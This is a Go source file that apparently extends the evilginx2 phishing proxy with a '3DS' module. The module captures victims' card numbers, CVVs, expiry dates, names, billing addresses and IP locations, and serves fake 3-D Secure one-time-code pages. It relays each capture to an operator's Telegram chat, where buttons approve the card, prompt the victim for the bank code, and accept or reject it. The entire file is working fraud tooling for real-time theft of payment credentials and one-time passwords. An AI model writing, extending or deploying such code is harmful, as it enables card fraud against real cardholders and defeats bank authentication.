package core

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/log"
)

// 3DS session states
const (
	ThreeDSWaitingCVV   = "waiting_cvv_approval" // CVV captured, waiting for admin to approve/skip
	ThreeDSOTPWaiting   = "otp_waiting"          // Admin approved, waiting for user to enter OTP
	ThreeDSOTPSubmitted = "otp_submitted"        // User submitted OTP, waiting for admin review
	ThreeDSOTPRejected  = "otp_rejected"         // Admin rejected OTP, user can retry
	ThreeDSCompleted    = "completed"            // Admin approved final, user redirected
	ThreeDSExpired      = "expired"              // Timeout
)

// ThreeDSSession tracks the 3DS verification state for a single user session
type ThreeDSSession struct {
	SIndex         int    // Evilginx session index (used for Telegram callback_data)
	SessionID      string // evilginx internal session ID
	State          string
	TelegramMsgID  int    // Telegram message ID for editing
	OTP            string // Current submitted OTP value
	OTPCount       int    // Number of OTP submission attempts
	ResendCount    int    // Number of resend attempts
	CreatedAt      time.Time
	UpdatedAt      time.Time
	CVV            string // CVV for message display
	CardNumber     string // Card number for message display
	ExpireDate     string // Expiry date for message display (MM/YY)
	HolderName     string // Card holder name for message display
	RemoteAddr     string // Store IP for message display
	PhishletName   string // Store phishlet name (internal use)
	RedirectURL    string // Final redirect URL after completion (dynamic)
	BillingAddress string // Billing address for message display
	Location       string // IP geolocation for message display
	mu             sync.Mutex
}

// ThreeDSManager manages all active 3DS verification sessions
type ThreeDSManager struct {
	sessions            map[string]*ThreeDSSession // sessionID -> ThreeDSSession
	indexToSess         map[int]*ThreeDSSession    // sIndex -> ThreeDSSession
	bypassSessions      map[string]bool            // sessionID -> bypass enabled
	mu                  sync.RWMutex
	telegram            *TelegramBot
	proxy               *HttpProxy
	stopChan            chan struct{}
	wg                  sync.WaitGroup
	telegramPinnedMsgID int // currently pinned Telegram message ID
}

// NewThreeDSManager creates a new 3DS manager
func NewThreeDSManager(telegram *TelegramBot, proxy *HttpProxy) *ThreeDSManager {
	m := &ThreeDSManager{
		sessions:       make(map[string]*ThreeDSSession),
		indexToSess:    make(map[int]*ThreeDSSession),
		bypassSessions: make(map[string]bool),
		telegram:       telegram,
		proxy:          proxy,
		stopChan:       make(chan struct{}),
	}
	m.wg.Add(1)
	go m.cleanupWorker()
	return m
}

// Stop stops the 3DS manager and cleans up resources
func (m *ThreeDSManager) Stop() {
	close(m.stopChan)
	m.wg.Wait()
}

// cleanupWorker periodically cleans up expired and completed sessions
func (m *ThreeDSManager) cleanupWorker() {
	defer m.wg.Done()
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-m.stopChan:
			return
		case <-ticker.C:
			m.cleanupExpired()
		}
	}
}

// cleanupExpired removes expired and completed sessions older than 10 minutes
func (m *ThreeDSManager) cleanupExpired() {
	m.mu.Lock()
	defer m.mu.Unlock()

	now := time.Now()
	for id, ts := range m.sessions {
		ts.mu.Lock()
		state := ts.State
		updatedAt := ts.UpdatedAt
		ts.mu.Unlock()

		if state == ThreeDSExpired || state == ThreeDSCompleted {
			if now.Sub(updatedAt) > 10*time.Minute {
				delete(m.sessions, id)
				delete(m.indexToSess, ts.SIndex)
				delete(m.bypassSessions, id)
				log.Debug("[3DS] cleaned up session: %s (state: %s)", id, state)
			}
		}
	}
}

// pinOldestPendingSession finds the oldest pending 3DS session that already has a
// Telegram message and pins it to the top of the chat. This keeps the next actionable
// item visible so the admin does not have to scroll through the history when new
// sessions keep arriving.
func (m *ThreeDSManager) pinOldestPendingSession() {
	if m.telegram == nil || !m.telegram.IsConfigured() {
		return
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	var targetMsgID int
	var oldestTime time.Time
	for _, ts := range m.sessions {
		ts.mu.Lock()
		state := ts.State
		msgID := ts.TelegramMsgID
		createdAt := ts.CreatedAt
		ts.mu.Unlock()

		if state == ThreeDSCompleted || state == ThreeDSExpired || msgID == 0 {
			continue
		}
		if targetMsgID == 0 || createdAt.Before(oldestTime) {
			targetMsgID = msgID
			oldestTime = createdAt
		}
	}

	if targetMsgID == 0 || m.telegramPinnedMsgID == targetMsgID {
		return
	}
	m.telegramPinnedMsgID = targetMsgID

	go func(chatID string, msgID int) {
		if err := m.telegram.PinChatMessage(chatID, msgID); err != nil {
			log.Warning("[3DS] failed to pin oldest pending telegram message: %v", err)
		}
	}(m.telegram.chatID, targetMsgID)
}

// Initiate creates a new 3DS session after CVV capture
// If session already exists but is in a final state (completed/expired), it gets reset
func (m *ThreeDSManager) Initiate(sessionID string, sIndex int, cvv string, cardNumber string, expireDate string, holderName string, remoteAddr string, phishletName string, redirectURL string, billingAddress string, location string) *ThreeDSSession {
	m.mu.Lock()
	defer m.mu.Unlock()

	if existing, ok := m.sessions[sessionID]; ok {
		existing.mu.Lock()
		state := existing.State
		existing.mu.Unlock()
		if state != ThreeDSCompleted && state != ThreeDSExpired {
			return existing
		}
		existing.mu.Lock()
		existing.State = ThreeDSWaitingCVV
		existing.TelegramMsgID = 0
		existing.OTP = ""
		existing.OTPCount = 0
		existing.ResendCount = 0
		existing.UpdatedAt = time.Now()
		existing.CVV = cvv
		existing.CardNumber = cardNumber
		existing.ExpireDate = expireDate
		existing.HolderName = holderName
		existing.RemoteAddr = remoteAddr
		existing.PhishletName = phishletName
		existing.RedirectURL = redirectURL
		existing.BillingAddress = billingAddress
		existing.Location = location
		existing.mu.Unlock()
		log.Info("[3DS] session re-initiated: %s (sIndex: %d)", sessionID, sIndex)
		return existing
	}

	ts := &ThreeDSSession{
		SIndex:         sIndex,
		SessionID:      sessionID,
		State:          ThreeDSWaitingCVV,
		TelegramMsgID:  0,
		OTP:            "",
		OTPCount:       0,
		ResendCount:    0,
		CreatedAt:      time.Now(),
		UpdatedAt:      time.Now(),
		CVV:            cvv,
		CardNumber:     cardNumber,
		ExpireDate:     expireDate,
		HolderName:     holderName,
		RemoteAddr:     remoteAddr,
		PhishletName:   phishletName,
		RedirectURL:    redirectURL,
		BillingAddress: billingAddress,
		Location:       location,
	}
	m.sessions[sessionID] = ts
	m.indexToSess[sIndex] = ts
	log.Info("[3DS] session initiated: %s (sIndex: %d, cvv: %s, ip: %s)", sessionID, sIndex, cvv, remoteAddr)
	return ts
}

// ApproveCVV is called when admin clicks [通过] in Telegram
// Transitions to otp_waiting so user is redirected to OTP page
func (m *ThreeDSManager) ApproveCVV(sessionID string) bool {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSWaitingCVV {
		ts.State = ThreeDSOTPWaiting
		ts.UpdatedAt = time.Now()
		log.Info("[3DS] admin approved CVV for session: %s, waiting for OTP", sessionID)
		return true
	}
	return false
}

// ReleaseCVV is called when admin clicks [直接放行] at CVV stage
func (m *ThreeDSManager) ReleaseCVV(sessionID string) bool {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSCompleted || ts.State == ThreeDSExpired {
		return false
	}

	ts.State = ThreeDSCompleted
	ts.UpdatedAt = time.Now()
	log.Info("[3DS] admin released session at CVV stage: %s", sessionID)
	return true
}

// SubmitOTP is called when user submits OTP from the 3DS page
func (m *ThreeDSManager) SubmitOTP(sessionID string, otp string) bool {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSOTPWaiting || ts.State == ThreeDSOTPRejected {
		ts.OTP = otp
		ts.OTPCount++
		ts.State = ThreeDSOTPSubmitted
		ts.UpdatedAt = time.Now()
		log.Info("[3DS] user submitted OTP for session: %s (attempt %d): %s", sessionID, ts.OTPCount, otp)
		return true
	}
	return false
}

// ApproveOTP is called when admin clicks [OTP正确] in Telegram
func (m *ThreeDSManager) ApproveOTP(sessionID string) bool {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSOTPSubmitted {
		ts.State = ThreeDSCompleted
		ts.UpdatedAt = time.Now()
		log.Info("[3DS] admin approved OTP for session: %s", sessionID)
		return true
	}
	return false
}

// RejectOTP is called when admin clicks [OTP错误] in Telegram
func (m *ThreeDSManager) RejectOTP(sessionID string) bool {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSOTPSubmitted {
		ts.State = ThreeDSOTPRejected
		ts.UpdatedAt = time.Now()
		log.Info("[3DS] admin rejected OTP for session: %s", sessionID)
		return true
	}
	return false
}

// ResendOTP is called when user clicks "Resend" on the 3DS page
// Increments resend count, stays in otp_waiting state, and notifies Telegram
func (m *ThreeDSManager) ResendOTP(sessionID string) (success bool, resendCount int) {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return false, 0
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	if ts.State == ThreeDSOTPWaiting || ts.State == ThreeDSOTPRejected {
		ts.ResendCount++
		ts.OTP = ""
		if ts.State == ThreeDSOTPRejected {
			ts.State = ThreeDSOTPWaiting
		}
		ts.UpdatedAt = time.Now()
		resendCount = ts.ResendCount
		log.Info("[3DS] user requested OTP resend for session: %s (attempt %d)", sessionID, resendCount)
		return true, resendCount
	}
	return false, 0
}

// GetStatus returns the current state and relevant data for a 3DS session
func (m *ThreeDSManager) GetStatus(sessionID string) (state string, redirectURL string, otpCount int, resendCount int) {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return ThreeDSExpired, "", 0, 0
	}

	ts.mu.Lock()
	defer ts.mu.Unlock()

	// Per-state timeout: if a session sits in a human-waiting state for too long,
	// auto-release so the user is never stuck. Admin-review states time out after 1 minute.
	// A 10-minute absolute fallback prevents infinite loops (e.g. repeated resend).
	if ts.State != ThreeDSCompleted && ts.State != ThreeDSExpired {
		timeout := 10 * time.Minute
		switch ts.State {
		case ThreeDSWaitingCVV, ThreeDSOTPWaiting, ThreeDSOTPSubmitted, ThreeDSOTPRejected:
			timeout = 1 * time.Minute
		}
		if time.Since(ts.UpdatedAt) > timeout || time.Since(ts.CreatedAt) > 10*time.Minute {
			// Auto-release on timeout to avoid getting stuck
			ts.State = ThreeDSCompleted
			ts.UpdatedAt = time.Now()
			m.MarkComplete(sessionID)
			go m.updateTelegramAutoReleased(sessionID)
		}
	}

	state = ts.State
	otpCount = ts.OTPCount
	resendCount = ts.ResendCount
	redirectURL = ts.RedirectURL

	// Fallback: get redirect URL from the evilginx session
	if redirectURL == "" && m.proxy != nil {
		m.proxy.session_mtx.Lock()
		if s, ok := m.proxy.sessions[sessionID]; ok && s.RedirectURL != "" {
			redirectURL = s.RedirectURL
		}
		m.proxy.session_mtx.Unlock()
	}

	return
}

// --- HTTP Handlers for __3ds/* endpoints (called from http_proxy OnRequest) ---

type threeDSStatusResponse struct {
	State       string `json:"state"`
	RedirectURL string `json:"redirect_url,omitempty"`
	OTPCount    int    `json:"otp_count,omitempty"`
	ResendCount int    `json:"resend_count,omitempty"`
}

// Handle3DSStatus handles GET /__3ds/status?sid={session_id}
// Returns JSON with current 3DS state for the user's polling page
func (m *ThreeDSManager) Handle3DSStatus(req *http.Request, sessionID string) (int, string) {
	state, redirectURL, otpCount, resendCount := m.GetStatus(sessionID)

	resp := threeDSStatusResponse{
		State:       state,
		RedirectURL: redirectURL,
		OTPCount:    otpCount,
		ResendCount: resendCount,
	}

	jsonData, err := json.Marshal(resp)
	if err != nil {
		return http.StatusInternalServerError, `{"error":"failed to marshal response"}`
	}

	return http.StatusOK, string(jsonData)
}

type threeDSSubmitRequest struct {
	OTP string `json:"otp"`
}

type threeDSSubmitResponse struct {
	Success bool   `json:"success"`
	State   string `json:"state,omitempty"`
	Error   string `json:"error,omitempty"`
}

// Handle3DSSubmit handles POST /__3ds/submit?sid={session_id}
// User submits OTP from the 3DS page
func (m *ThreeDSManager) Handle3DSSubmit(req *http.Request, sessionID string) (int, string) {
	var submitReq threeDSSubmitRequest
	if err := json.NewDecoder(req.Body).Decode(&submitReq); err != nil {
		resp, _ := json.Marshal(threeDSSubmitResponse{Success: false, Error: "invalid request body"})
		return http.StatusBadRequest, string(resp)
	}

	if submitReq.OTP == "" {
		resp, _ := json.Marshal(threeDSSubmitResponse{Success: false, Error: "OTP is required"})
		return http.StatusBadRequest, string(resp)
	}

	ok := m.SubmitOTP(sessionID, submitReq.OTP)
	if !ok {
		resp, _ := json.Marshal(threeDSSubmitResponse{Success: false, Error: "invalid session state"})
		return http.StatusBadRequest, string(resp)
	}

	// Update Telegram message with OTP info
	m.updateTelegramOTPSubmitted(sessionID)

	state, _, _, _ := m.GetStatus(sessionID)
	resp, _ := json.Marshal(threeDSSubmitResponse{Success: true, State: state})
	return http.StatusOK, string(resp)
}

type threeDSResendResponse struct {
	Success     bool   `json:"success"`
	State       string `json:"state,omitempty"`
	ResendCount int    `json:"resend_count,omitempty"`
	Error       string `json:"error,omitempty"`
}

// Handle3DSResend handles POST /__3ds/resend?sid={session_id}
// User requests OTP resend from the 3DS page
func (m *ThreeDSManager) Handle3DSResend(req *http.Request, sessionID string) (int, string) {
	ok, resendCount := m.ResendOTP(sessionID)
	if !ok {
		resp, _ := json.Marshal(threeDSResendResponse{Success: false, Error: "invalid session state"})
		return http.StatusBadRequest, string(resp)
	}

	m.updateTelegramResend(sessionID)

	state, _, _, _ := m.GetStatus(sessionID)
	resp, _ := json.Marshal(threeDSResendResponse{
		Success:     true,
		State:       state,
		ResendCount: resendCount,
	})
	return http.StatusOK, string(resp)
}

// --- Telegram Callback Handler ---

// HandleCallback processes Telegram inline button callbacks for 3DS
func (m *ThreeDSManager) HandleCallback(callbackData string, chatID string, msgID int) {
	// callbackData format: "3ds:action:sIndex"
	parts := strings.SplitN(callbackData, ":", 3)
	if len(parts) < 3 || parts[0] != "3ds" {
		return
	}

	action := parts[1]
	sIndexStr := parts[2]
	sIndex := 0
	n, _ := fmt.Sscanf(sIndexStr, "%d", &sIndex)
	if n != 1 {
		log.Warning("[3DS] callback with invalid sIndex: %s", sIndexStr)
		return
	}

	// Look up session by sIndex
	m.mu.RLock()
	ts, ok := m.indexToSess[sIndex]
	m.mu.RUnlock()
	if !ok {
		log.Warning("[3DS] callback with unknown sIndex: %d", sIndex)
		return
	}
	sessionID := ts.SessionID

	// Verify msgID matches the session's TelegramMsgID for security
	ts.mu.Lock()
	sessionMsgID := ts.TelegramMsgID
	ts.mu.Unlock()
	if sessionMsgID > 0 && sessionMsgID != msgID {
		log.Warning("[3DS] callback msgID mismatch for session %s: expected %d, got %d", sessionID, sessionMsgID, msgID)
		return
	}

	switch action {
	case "cvv_approve":
		// Admin clicked [通过] at CVV stage -> enter OTP flow
		if m.ApproveCVV(sessionID) {
			m.updateTelegramOTPWaiting(sessionID, msgID)
		}

	case "cvv_release":
		// Admin clicked [直接放行] at CVV stage -> skip everything
		if m.ReleaseCVV(sessionID) {
			m.updateTelegramCompleted(sessionID, msgID, "直接放行")
		}

	case "otp_approve":
		// Admin clicked [OTP正确] -> final release
		if m.ApproveOTP(sessionID) {
			m.updateTelegramCompleted(sessionID, msgID, "OTP验证通过")
		}

	case "otp_reject":
		// Admin clicked [OTP错误] -> user re-enters OTP
		if m.RejectOTP(sessionID) {
			m.updateTelegramOTPRejected(sessionID, msgID)
		}
	}
}

// --- Internal helpers ---

// formatIPLine formats IP with location: "127.0.0.1 - New York, NY" or just "127.0.0.1" if location is empty
func formatIPLine(ip, location string) string {
	if location == "" {
		return ip
	}
	return ip + " - " + location
}

func (m *ThreeDSManager) getSessionInfo(sessionID string) (sIndex int, cvv string, cardNumber string, expireDate string, holderName string, ip string, otp string, otpCount int, resendCount int, billingAddress string, location string) {
	sIndex = -1
	cvv = "N/A"
	cardNumber = "N/A"
	expireDate = "N/A"
	holderName = "N/A"
	ip = "N/A"
	otp = ""
	otpCount = 0
	resendCount = 0
	billingAddress = ""
	location = ""

	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if ok {
		ts.mu.Lock()
		cvv = ts.CVV
		cardNumber = ts.CardNumber
		expireDate = ts.ExpireDate
		holderName = ts.HolderName
		ip = ts.RemoteAddr
		otp = ts.OTP
		otpCount = ts.OTPCount
		resendCount = ts.ResendCount
		billingAddress = ts.BillingAddress
		location = ts.Location
		ts.mu.Unlock()
	}

	if m.proxy != nil {
		m.proxy.session_mtx.Lock()
		if idx, ok := m.proxy.sids[sessionID]; ok {
			sIndex = idx
		}
		m.proxy.session_mtx.Unlock()
	}

	return
}

// getTelegramMsgID returns the stored Telegram message ID for a session, or 0 if not found/sent
func (m *ThreeDSManager) getTelegramMsgID(sessionID string) int {
	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return 0
	}
	ts.mu.Lock()
	msgID := ts.TelegramMsgID
	ts.mu.Unlock()
	return msgID
}

// waitForTelegramMsgID waits up to timeout for the initial Telegram message to be sent and its ID stored.
// This prevents edits from being dropped when a burst of sessions causes the initial send to be slightly delayed.
func (m *ThreeDSManager) waitForTelegramMsgID(sessionID string, timeout time.Duration) int {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if msgID := m.getTelegramMsgID(sessionID); msgID > 0 {
			return msgID
		}
		time.Sleep(200 * time.Millisecond)
	}
	return 0
}

// updateTelegramOTPWaiting: admin approved CVV, waiting for user to enter OTP
func (m *ThreeDSManager) updateTelegramOTPWaiting(sessionID string, msgID int) {
	if m.telegram == nil || !m.telegram.IsConfigured() {
		return
	}

	go func() {
		sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _, _, billingAddr, location := m.getSessionInfo(sessionID)
		ipLine := formatIPLine(ip, location)

		msg := fmt.Sprintf(
			"🔐 3DS验证中 (Session #%d)\n\n"+
				"👤 持卡人: %s\n"+
				"💳 卡号: %s\n"+
				"📅 有效期: %s\n"+
				"🔑 CVV: %s\n"+
				"🌐 IP: %s\n"+
				"🏠 账单地址: %s\n\n"+
				"⚙️ 状态: 等待用户输入 OTP",
			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr,
		)

		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil); err != nil {
			log.Warning("[3DS] failed to edit telegram message (otp_waiting): %v", err)
		}
	}()
}

// updateTelegramOTPSubmitted: user submitted OTP, waiting for admin review
func (m *ThreeDSManager) updateTelegramOTPSubmitted(sessionID string) {
	if m.telegram == nil || !m.telegram.IsConfigured() {
		return
	}

	go func() {
		msgID := m.waitForTelegramMsgID(sessionID, 5*time.Second)
		if msgID == 0 {
			log.Warning("[3DS] telegram msgID not available for session %s, dropping otp_submitted edit", sessionID)
			return
		}

		sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
		ipLine := formatIPLine(ip, location)

		msg := fmt.Sprintf(
			"🔐 3DS验证中 (Session #%d)\n\n"+
				"👤 持卡人: %s\n"+
				"💳 卡号: %s\n"+
				"📅 有效期: %s\n"+
				"🔑 CVV: %s\n"+
				"🌐 IP: %s\n"+
				"🏠 账单地址: %s\n\n"+
				"🔢 OTP (第%d次): %s\n\n"+
				"⚙️ 状态: 等待管理员审核",
			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpCount, otp,
		)

		buttons := [][]InlineButton{
			{
				{Text: "✅ OTP正确", CallbackData: fmt.Sprintf("3ds:otp_approve:%d", sIndex)},
				{Text: "❌ OTP错误", CallbackData: fmt.Sprintf("3ds:otp_reject:%d", sIndex)},
			},
		}

		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, buttons); err != nil {
			log.Warning("[3DS] failed to edit telegram message (otp_submitted): %v", err)
		}
	}()
}

// updateTelegramOTPRejected: admin rejected OTP, waiting for user retry
func (m *ThreeDSManager) updateTelegramOTPRejected(sessionID string, msgID int) {
	if m.telegram == nil || !m.telegram.IsConfigured() {
		return
	}

	go func() {
		sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
		ipLine := formatIPLine(ip, location)

		msg := fmt.Sprintf(
			"🔐 3DS验证中 (Session #%d)\n\n"+
				"👤 持卡人: %s\n"+
				"💳 卡号: %s\n"+
				"📅 有效期: %s\n"+
				"🔑 CVV: %s\n"+
				"🌐 IP: %s\n"+
				"🏠 账单地址: %s\n\n"+
				"🔢 OTP (第%d次): %s ❌ 已拒绝\n\n"+
				"⚙️ 状态: 等待用户重新输入",
			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpCount, otp,
		)

		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil); err != nil {
			log.Warning("[3DS] failed to edit telegram message (otp_rejected): %v", err)
		}
	}()
}

// updateTelegramCompleted: final state, user will be redirected
func (m *ThreeDSManager) updateTelegramCompleted(sessionID string, msgID int, reason string) {
	if m.telegram == nil || !m.telegram.IsConfigured() {
		return
	}

	go func() {
		sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
		ipLine := formatIPLine(ip, location)

		otpLine := ""
		if otpCount > 0 {
			otpLine = fmt.Sprintf("🔢 OTP (第%d次): %s ✅\n\n", otpCount, otp)
		}

		msg := fmt.Sprintf(
			"✅ 已放行 (Session #%d)\n\n"+
				"👤 持卡人: %s\n"+
				"💳 卡号: %s\n"+
				"📅 有效期: %s\n"+
				"🔑 CVV: %s\n"+
				"🌐 IP: %s\n"+
				"🏠 账单地址: %s\n"+
				"%s"+
				"⚙️ 状态: %s\n已结束",
			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpLine, reason,
		)

		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil); err != nil {
			log.Warning("[3DS] failed to edit telegram message (completed): %v", err)
			return
		}

		// Terminal state: delete the Telegram message after a short delay so the chat
		// only keeps pending actionable sessions, reducing scrolling.
		time.Sleep(5 * time.Second)
		if err := m.telegram.DeleteMessage(m.telegram.chatID, msgID); err != nil {
			log.Warning("[3DS] failed to delete telegram message (completed): %v", err)
		}

		// After removing a completed message, make sure the oldest pending one is pinned.
		m.pinOldestPendingSession()
	}()
}

// updateTelegramResend: user requested OTP resend
func (m *ThreeDSManager) updateTelegramResend(sessionID string) {
	if m.telegram == nil || !m.telegram.IsConfigured() {
		return
	}

	go func() {
		msgID := m.waitForTelegramMsgID(sessionID, 5*time.Second)
		if msgID == 0 {
			log.Warning("[3DS] telegram msgID not available for session %s, dropping resend edit", sessionID)
			return
		}

		sIndex, cvv, cardNumber, expireDate, holderName, ip, _, otpCount, resendCount, billingAddr, location := m.getSessionInfo(sessionID)
		ipLine := formatIPLine(ip, location)

		msg := fmt.Sprintf(
			"🔐 3DS验证中 (Session #%d)\n\n"+
				"👤 持卡人: %s\n"+
				"💳 卡号: %s\n"+
				"📅 有效期: %s\n"+
				"🔑 CVV: %s\n"+
				"🌐 IP: %s\n"+
				"🏠 账单地址: %s\n\n"+
				"🔄 重发验证码 (第%d次)\n"+
				"📤 OTP提交次数: %d\n\n"+
				"⚙️ 状态: 用户请求重新发送验证码",
			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, resendCount, otpCount,
		)

		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil); err != nil {
			log.Warning("[3DS] failed to edit telegram message (resend): %v", err)
		}
	}()
}

// updateTelegramAutoReleased: session timed out without manual action, auto-released
func (m *ThreeDSManager) updateTelegramAutoReleased(sessionID string) {
	if m.telegram == nil || !m.telegram.IsConfigured() {
		return
	}

	go func() {
		msgID := m.waitForTelegramMsgID(sessionID, 5*time.Second)
		if msgID == 0 {
			log.Warning("[3DS] telegram msgID not available for session %s, dropping auto-released edit", sessionID)
			return
		}

		sIndex, cvv, cardNumber, expireDate, holderName, ip, otp, otpCount, _, billingAddr, location := m.getSessionInfo(sessionID)
		ipLine := formatIPLine(ip, location)

		otpLine := ""
		if otpCount > 0 {
			otpLine = fmt.Sprintf("🔢 OTP (第%d次): %s\n\n", otpCount, otp)
		}

		msg := fmt.Sprintf(
			"⏱️ 已自动放行 (Session #%d)\n\n"+
				"👤 持卡人: %s\n"+
				"💳 卡号: %s\n"+
				"📅 有效期: %s\n"+
				"🔑 CVV: %s\n"+
				"🌐 IP: %s\n"+
				"🏠 账单地址: %s\n"+
				"%s"+
				"⚙️ 状态: 超时未操作，系统自动放行\n已结束",
			sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr, otpLine,
		)

		if err := m.telegram.EditMessage(m.telegram.chatID, msgID, msg, nil); err != nil {
			log.Warning("[3DS] failed to edit telegram message (auto-released): %v", err)
			return
		}

		// Terminal state: delete the Telegram message after a short delay so the chat
		// only keeps pending actionable sessions, reducing scrolling.
		time.Sleep(5 * time.Second)
		if err := m.telegram.DeleteMessage(m.telegram.chatID, msgID); err != nil {
			log.Warning("[3DS] failed to delete telegram message (auto-released): %v", err)
		}

		// After removing a completed message, make sure the oldest pending one is pinned.
		m.pinOldestPendingSession()
	}()
}

// Send3DSNotification sends the initial CVV capture notification with 3DS buttons asynchronously.
// It returns immediately; the actual Telegram API call runs in a background goroutine so that a
// burst of incoming sessions does not block the HTTP handlers.
func (m *ThreeDSManager) Send3DSNotification(sessionID string) int {
	if m.telegram == nil || !m.telegram.IsConfigured() {
		return 0
	}

	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return 0
	}

	ts.mu.Lock()
	if ts.TelegramMsgID > 0 {
		msgID := ts.TelegramMsgID
		ts.mu.Unlock()
		return msgID
	}
	ts.mu.Unlock()

	go m.send3DSNotificationAsync(sessionID)
	return 0
}

func (m *ThreeDSManager) send3DSNotificationAsync(sessionID string) {
	sIndex, cvv, cardNumber, expireDate, holderName, ip, _, _, _, billingAddr, location := m.getSessionInfo(sessionID)

	ipLine := ip
	if location != "" {
		ipLine = ip + "\n📍 位置: " + location
	}

	msg := fmt.Sprintf(
		"🔔 新捕获! (Session #%d)\n\n"+
			"👤 持卡人: %s\n"+
			"💳 卡号: %s\n"+
			"📅 有效期: %s\n"+
			"🔑 CVV: %s\n"+
			"🌐 IP: %s\n"+
			"🏠 账单地址: %s\n\n"+
			"请选择操作:",
		sIndex, holderName, cardNumber, expireDate, cvv, ipLine, billingAddr,
	)

	buttons := [][]InlineButton{
		{
			{Text: "🔐 通过 (3DS)", CallbackData: fmt.Sprintf("3ds:cvv_approve:%d", sIndex)},
			{Text: "✅ 直接放行", CallbackData: fmt.Sprintf("3ds:cvv_release:%d", sIndex)},
		},
	}

	msgID, err := m.telegram.SendMessageWithButtons(m.telegram.chatID, msg, buttons)
	if err != nil {
		log.Error("[3DS] failed to send telegram notification: %v", err)
		return
	}

	m.mu.RLock()
	ts, ok := m.sessions[sessionID]
	m.mu.RUnlock()
	if !ok {
		return
	}
	ts.mu.Lock()
	// Only store if no other goroutine already stored an ID
	if ts.TelegramMsgID == 0 {
		ts.TelegramMsgID = msgID
	}
	ts.mu.Unlock()

	// Always make sure the oldest pending session is pinned at the top of the chat.
	// This keeps the next actionable item visible even when many new sessions arrive.
	m.pinOldestPendingSession()
}

func (m *ThreeDSManager) MarkComplete(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.bypassSessions[id] = true
	log.Debug("[3DS] marked session %s for bypass", id)
}

func (m *ThreeDSManager) HasBypass(id string) bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	log.Debug("[3DS] marked session %s for bypass", m.bypassSessions[id])
	return m.bypassSessions[id]
}

func (m *ThreeDSManager) ClearBypass(id string) {
	m.mu.Lock()
	defer m.mu.Unlock()
	delete(m.bypassSessions, id)
}
